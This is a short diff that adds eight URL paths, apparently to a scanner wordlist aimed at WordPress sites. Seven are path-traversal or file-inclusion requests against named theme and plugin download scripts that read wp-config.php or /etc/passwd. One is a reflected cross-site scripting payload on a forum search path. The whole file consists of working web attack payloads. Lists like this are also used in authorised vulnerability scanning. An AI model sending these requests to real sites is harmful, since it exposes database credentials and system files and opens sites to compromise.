@@ -1,0 +1,8 @@
+/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
+/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
+/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
+/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
+/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
+/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
+/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php
+/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
